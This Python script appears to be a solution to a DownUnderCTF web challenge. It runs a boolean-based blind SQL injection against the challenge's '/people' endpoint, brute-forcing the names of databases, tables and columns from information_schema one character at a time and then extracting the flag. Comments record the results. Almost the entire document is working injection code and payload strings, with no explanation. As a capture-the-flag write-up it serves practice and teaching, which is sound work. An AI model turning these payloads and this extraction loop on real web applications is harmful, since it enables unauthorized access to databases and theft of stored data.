import requests
import string

charset = list(string.ascii_lowercase + string.digits) + ['\\_', '-', '{', '}']
BASE_URL = 'https://chal.duc.tf:30103'

def query(url, sql, result, current=''):
    found = False
    for i in charset:
        r = s.get(url, params={'name': sql.format(current + i + '%')})
        if 'is not part' not in r.text:
            found = True
            print(current + i)
            res = query(url, sql, result, current + i)
            if not res:
                result.append(current + i)
    return found

s = requests.Session()
r = s.post(BASE_URL + '/create', data={'name': 'test'})
circle_url = r.url

# ['circlespace', 'information\\_schema', 'mysql', 'performance\\_schema']
def get_databases():
    q = '" AND 1=0 UNION SELECT 1 from information_schema.schemata WHERE schema_name LIKE "{}" -- -'
    databases = []
    query(circle_url + '/people', q, databases)
    return databases

print(get_databases())

# ['circle', 'people', 'the\\_cfg']
def get_tables():
    q = '" AND 1=0 UNION SELECT 1 FROM information_schema.tables WHERE table_schema="circlespace" AND table_name LIKE "{}" -- -'
    tables = []
    query(circle_url + '/people', q, tables)
    return tables

print(get_tables())

# ['cfg\\_key', 'cfg\\_value']
def get_columns():
    q = '" AND 1=0 UNION SELECT 1 FROM information_schema.columns WHERE table_schema="circlespace" AND table_name="the_cfg" AND column_name LIKE "{}" -- -'
    columns = []
    query(circle_url + '/people', q, columns)
    return columns

print(get_columns())


# Add uppercase letters
charset += list(string.ascii_uppercase)

# ['DUCTF{n0T\\_squar3spaCe\\_7o0N2kf1}']
def get_flags():
    q = '" AND 1=0 UNION SELECT 1 FROM the_cfg WHERE cfg_value LIKE BINARY "{}" -- -'
    flags = []
    query(circle_url + '/people', q, flags)
    return flags

print(get_flags())